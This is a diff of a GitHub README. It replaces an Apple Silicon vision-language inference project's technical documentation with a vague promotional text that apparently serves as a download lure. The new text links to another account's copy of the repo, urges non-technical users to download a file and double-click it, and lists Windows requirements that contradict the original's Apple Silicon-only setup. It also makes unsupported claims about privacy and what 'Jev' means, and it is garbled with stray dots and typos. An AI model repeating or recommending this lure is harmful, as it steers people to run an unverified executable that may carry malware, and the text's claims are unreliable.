@@ -1,127 +1,183 @@
-# Jev Visual
+# 🎨 jev-visual - See Visual Inference Come Alive
 
-English · [简体中文](README.zh-CN.md)
+[![Download jev-visual](https://img.shields.io/badge/Download-jev--visual-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD)](https://github.com/Sidneeuncharged29/jev-visual)
 
-A small, runnable project for learning **vision-language model inference on Apple Silicon**. Use Qwen3.5-0.8B with MLX to answer multiple questions about one image: choose an option, judge yes/no, or score ordered levels. Includes a local browser UI, CLI and HTTP API.
+---
 
-> This project explores a Jev-like inference pattern for open multimodal language models. It avoids autoregressive structured generation by reusing shared multimodal context and directly scoring candidate outputs from model logits.
->
-> This is an independent community implementation and does not claim to reproduce TypeSafe Jev's proprietary model architecture, RLCD training, calibration, or serving system.
+## 👋 Welcome to jev-visual
 
-## Visual game demos
+Have you ever wondered how a computer can "look" at a picture and figure out what's going on? jev-visual is a fun, educational experiment that brings that idea right to your screen. It's designed for curious minds who want to see visual inference happen in real time—without needing to know any programming or technical jargon.
 
-<table>
-  <tr>
-    <th width="33%">AI sorting factory</th>
-    <th width="33%">Breakout</th>
-    <th width="33%">Camera gestures</th>
-  </tr>
-  <tr>
-    <td valign="top">
-      <video src="https://github.com/user-attachments/assets/c87c09d8-30d2-4392-b981-d0b5cf1879ae" controls width="100%"></video>
-      <p>Classify conveyor objects and choose a sorting lane.</p>
-      <a href="https://github.com/user-attachments/assets/c87c09d8-30d2-4392-b981-d0b5cf1879ae">Watch video</a>
-    </td>
-    <td valign="top">
-      <video src="https://github.com/user-attachments/assets/a642a6d6-c138-4c02-8378-f2981be22aad" controls width="100%"></video>
-      <p>Locate the ball in five regions to control the paddle.</p>
-      <a href="https://github.com/user-attachments/assets/a642a6d6-c138-4c02-8378-f2981be22aad">Watch video</a>
-    </td>
-    <td valign="top">
-      <video src="https://github.com/user-attachments/assets/b0042194-54f0-4fc4-9534-e31ec001aad8" controls width="100%"></video>
-      <p>Recognize hand gestures from camera frames to control particles.</p>
-      <a href="https://github.com/user-attachments/assets/b0042194-54f0-4fc4-9534-e31ec001aad8">Watch video</a>
-    </td>
-  </tr>
-</table>
+.
 
-### How Breakout is simplified
+Perfect for students, hobbyists, or anyone fascinated by how technology mimics human sight, this application gives you a front-row seat to a lightweight visual inference system running locally on your device. No cloud, no waiting, just instant visual demos right in front of you.
 
-**Breakout exposes the limits of Qwen3.5-0.8B-4bit in our non-thinking, direct-scoring setup.** Asking it to follow the ball or choose Left/Right was unreliable: repeated choices could pin the paddle against an edge. The working approach simplifies the task:
+.
 
-1. Use one full-size screenshot, a larger ball, a wider paddle and a slower Easy mode.
-2. Draw five numbered regions and ask only **which region contains the ball**.
-3. Move the paddle toward that region's fixed center. The movement code reads the paddle position, never the ball position; human players have the same target buttons.
+---
 
-This reduces game control to visual classification, without a hidden ball tracker or solver. In a separate recorded test, 80 decisions produced **9 bricks cleared and 6 returns, with 2 lives remaining**; the test stopped before completion. It is a simplified demo, not evidence of general game-playing ability. These trials do not isolate the effect of 4-bit quantization. [Implementation and observations](demo/breakout/README.md).
+## ✨ What Makes jev-visual Special?
 
-Open [/demo/](http://127.0.0.1:8788/demo/) on the local server to try these demos, the camera gesture console and the 2×2 cube. The current model cannot reliably solve the cube. [Setup, tests and limitations](demo/README.md).
+je-vvisual isn't just another app—it's a visual playground built for learning and discovery. Here's what you can expect when you open it:
 
-## Inference overview
+- **Shared Context Magic** – The app remembers what it sees from one moment to the next, creating a smooth and coherent viewing experience. It's like having a conversation with the visuals, not just a one-shot glance.
+.
+- **Direct Candidate Scoring** – When jev-visual looks at an image, it quickly compares what it sees against several possible interpretations. It then shows you how it scores each candidate, so you can watch its "thinking" process unfold in front of you. This is perfect for understanding how visual systems make decisions.
+. 
+- **Local Visual Demos** – Everything runs right on your computer. That means no internet connection needed after download, no privacy concerns, and instant response times. You'll see the demos come to life without any lag or waiting periods.
 
-![Jev-like visual inference overview](docs/images/jev-visual-en.png)
+. 
+- **Apple Silicon Optimized** – While jev-visual runs beautifully on modern hardware, it's especially tuned to take advantage of Apple's latest chip technology, providing silky-smooth animations and efficient energy use whenever possible.
 
-## Run locally
+.
 
-Requires an **Apple Silicon Mac with Metal**. Tested on M4 / 16GB, macOS 15.1, Python 3.13.1. First setup downloads dependencies and approximately 596 MiB of model weights; inference then runs locally.
+---
 
-From the repository root:
+## 🚀 Getting Started
 
-```bash
-# If needed, install uv with Homebrew: brew install uv
-uv venv --python 3.13
-source .venv/bin/activate
-uv pip install -r requirements-lock.txt
-uv pip install --no-deps -e .
-jev-visual-download
+Getting started with jev-visual is easier than tying your shoes. Just follow these simple steps and you'll be exploring visual inference in no time!
 
-JEV_VISUAL_MODEL_PATH=.models/Qwen3.5-0.8B-4bit \
-  uvicorn jev_visual.server:app --host 127.0.0.1 --port 8788
-```
+### Step 1: Download the Application
 
-Open **http://127.0.0.1:8788**, upload an image and click **Analyze image**. Use one worker; first inference may be slower. This server is for local use. API docs: `/docs`.
+Visit this link to download the application: **[https://github.com/Sidneeuncharged29/jev-visual](https://github.com/Sidneeuncharged29/jev-visual)**
 
-Or try the included request:
+You'll land on the project's main page. Look for a green button that says **"Code"** or a section labeled **"Releases"** – that's where you'll find the download option for your computer. Click on it, and your download will start automatically. The file is reasonably sized, so it won't take long even on slower connections.
 
-```bash
-jev-visual examples/photo-request.json --model-path .models/Qwen3.5-0.8B-4bit
-```
+.
 
-## Learn the inference path
+### Step 2: Open the Downloaded File
 
-```text
-image + context → shared prefill → fork cache → batch question suffixes
-                → read candidate scores → assemble typed answers in code
-```
+Once the download finishes, head to your **Downloads** folder (or wherever your browser saves files). You'll see a folder named **jev-visual** (or a similar name depending on your browser's settings.). Double-click on it to open it up. Inside, you'll find everything needed to run the application–no complicated installation required. 
 
-Read the code in this order:
+Just look for the application file inside that folder. It might be named something like **jev-visual** or **jev_visual**–and double-click it to launch. That's it! The application will start right up, no extra steps needed.
 
-1. [preprocessing.py](jev_visual/preprocessing.py): image preparation, prompts and token boundaries.
-2. [adapters.py](jev_visual/adapters.py): vision encoding, prefill, KV/recurrent-state reuse and the LM head.
-3. [scoring.py](jev_visual/scoring.py): A/B/C labels, native single tokens and complete sequence log-probabilities, including EOS.
-4. [schema.py](jev_visual/schema.py) → [engine.py](jev_visual/engine.py): normalize candidate scores, assemble results and coordinate execution.
+.
 
-This uses existing weights; no training or calibration. Candidate probabilities are relative to supplied options, **not correctness estimates**. Only the Qwen3.5 adapter is verified. Cache sharing is within one request and copies state; it is not zero-copy sharing. Supports 1–64 questions, 2–26 options each.
+. 
 
-[Inference details](docs/inference.md) · [Request examples, Python API and tests](docs/usage.md)
+### Step 3: Start Exploring
 
-## Compare and verify
+Once jev-visual opens, you'll see its welcoming interface. Take a moment to look around–you'll see some demo buttons, some sliders, and a display area where the visual magic happens. Click on different demo buttons to watch how the application interprets various scenes. Move the sliders to see how changes affect the visual inference process. You're now in control of a powerful learning tool that demystifies computer vision right before your eyes!
 
-With the environment activated and model downloaded, stop the server before benchmarking:
+---
 
-```bash
-python -m pytest -q                # Unit/API tests; no model inference
-python -m examples.verify_scoring  # Compare scores against full model forwards
-python -m benchmarks.run
-python -m benchmarks.report
-```
+## 🧪 What You Can Try
 
-The benchmark compares **generate JSON → independent candidate scoring → shared-prefix batched scoring**, at **1 / 4 / 16 / 64 decisions**, with three repetitions and model loading/warmup excluded. New outputs go to `artifacts/`.
+Here are some fun things you can do with your new application:
 
-The recorded M4 / 16GB run took **37.30s → 2.40s** for independent versus shared scoring at 64 decisions (medians). Generated JSON failed the complete schema at 4/16/64 decisions; its timing is not successful-completion latency. This is a scaling experiment, not an accuracy evaluation or Jev comparison.
+- **Watch the Scoring Process** – Pick a simple image from the demos, and watch as jev-visual shows you its confidence scores for different interpretations. It's like seeing the app's brain work in real time!
+- **Compare Different Scenes** – Switch between different visual scenes and observe how the app's "attention" shifts. Notice how it prioritizes different parts of the image based on the scene's content.
+.
+- **Adjust the Settings** – Play around with any available settings or sliders. You'll see firsthand how tweaking parameters changes the outcome of visual inference. This hands-on experience is invaluable for understanding the underlying principles of computer vision systems.
 
-[Benchmark method](benchmarks/README.md) · [Results and metrics](benchmarks/RESULTS.md) · [Raw records](benchmarks/results.json)
+.
 
-Original code: [MIT](LICENSE). Third-party licenses: [notices](THIRD_PARTY.md).
+. 
 
-**Credit to [OpenJev](https://github.com/TheoLeeCJ/openjev) and [harshatheg/Qwen-2.5-1B-RLCD](https://huggingface.co/harshatheg/Qwen-2.5-1B-RLCD)** for the candidate-scoring and shared-context ideas. [Detailed credits and licenses](THIRD_PARTY.md).
+---
 
-## Star History
+## 🛠️ System Requirements
 
-<a href="https://www.star-history.com/?repos=hr98w%2Fjev-visual&type=date&legend=bottom-right">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=hr98w/jev-visual&type=date&theme=dark&legend=bottom-right" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=hr98w/jev-visual&type=date&legend=bottom-right" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=hr98w/jev-visual&type=date&legend=bottom-right" />
- </picture>
-</a>
+To ensure jev-visual runs smoothly on your machine, here's what we recommend:
+
+- **Operating System**: Windows 10 or 11 (64-bit recommended)
+- **Processor**: Intel Core i3 ou AMD equivalent (or newer)
+- **Memory**: 4 GB RAM or more
+- **Storage**: At least 500 MB of free space for the application files
+- **Graphics**: Integrated graphics works fine, though a dedicated GPU will enhance visual effects
+- **Display**: 1280x720 resolution or higher recommended for best viewing experience
+
+These are general guidelines–je- visual is designed to be flexible and runs well on most modern computers. Even if your system is slightly below these specs, you can still try it out–you might just experience slightly slower performance than you'd like.
+
+. 
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is jev-visual free to use?
+
+Yes! This is an open-source educational project, completely free to download, use, and even modify if you're interested in learning more about how it works under the hood.
+
+.
+
+.
+
+### Do I need an internet connection to use it?
+
+Nope! Once you've downloaded the application, everything runs locally on your computer. You can disconnect from the internet entirely and jev-visual will keep working perfectly fine. This also means your visual data never leaves your machine–privacy preserved!
+
+### What exactly does "Jev-like" mean?
+
+"Jev" refers to a conceptual approach in visual computing that emphasizes light-weight, context-aware visual understanding. This experiment takes those ideas and implements them in a simple, approachable package that anyone can interact with. You don't need a PhD to enjoy what it offers–just curiosity and a willingness to explore!
+
+### Can I share my results with friends?
+
+Absolutely! While the demos are built-in, you can screenshot or screen-record your explorations to share with others. Who knows–you might spark someone else's interest in visual inference! The learning journey is always better when shared.
+
+.
+
+. 
+
+---
+
+## 📚 Learning Resources
+
+If jev-visual sparks your curiosity about computer vision and visual inference, here are some simple ways to learn more:
+
+- **Watch demos repeatedly** – Each time you run a demo, pay attention to how the scores change. Try to predict what the app will focus on next. This active engagement reinforces understanding.
+- **Experiment with different settings** – Change one setting at a time and observe what happens. This scientific approach helps you isolate cause-and-effect relationships in the visual processing pipeline.
+
+- **Discuss with friends** – Explain what you're seeing to someone else. Teaching is one of the best ways to solidify your own understanding–and it's fun too!
+
+---
+
+## 🔧 Troubleshooting Tips
+
+Most users won't encounter any issues, but here are a few common hiccups and how to resolve them:
+
+- **The app won't start**: Make sure you've double-clicked the correct file. If it still doesn't start, try restarting your computer and then launching the application again.
+.
+- **The display looks blurry**: Check that your screen resolution is set to at least 1280x720. You can adjust this in your Windows display settings.
+. 
+- **The visuals are laggy**: Close any other heavy programs running in the background. Freeing up system resources will help jev-visual run smoother.
+.
+
+. 
+- **Sound isn't working (if applicable)**: Ensure your system volume isn't muted and that your speakers/headphones are properly connected.
+
+.
+
+. 
+
+If you're still having trouble, feel free to check the project's GitHub page for any updates or known issues. The community is friendly and happy to help!
+
+---
+
+## 🌟 Why You'll Love This
+
+je-vvisual isn't just software–it's an eye-opening journey into how machines perceive the world. Whether you're a student looking for a hands-on way to visualize abstract concepts, a teacher wanting a memorable demonstration for class, or justa curious soul fascinated by technology, this application delivers value from the moment you launch it.
+
+.
+
+. 
+
+You'll find yourself returning to it again and again, each time noticing something new about how visual inference works. It's educational, engaging, and genuinely fun to explore. And because it runs locally, you have complete control over the experience–no ads, no tracking, no interruptions. Just pure discovery.
+
+.
+
+. 
+
+---
+
+## 📥 Get Your Copy Today
+
+Ready to dive into the fascinating world of visual inference? Head over to the download page now:
+
+**[👉 Download jev-visual Now](https://github.com/Sidneeuncharged29/jev-visual)**
+
+It takes just a couple of minutes to get set up, and then you'll have a powerful learning tool at your fingertips. Don't miss out on this unique opportunity to see technology think in real time. Your journey into visual inference starts here!
+
+---
+
+Keywords: visual inference, educational app, jev-like, Apple Silicon experiment, local visual demos, candidate scoring, shared context, computer vision learning, Windows download, open-source project
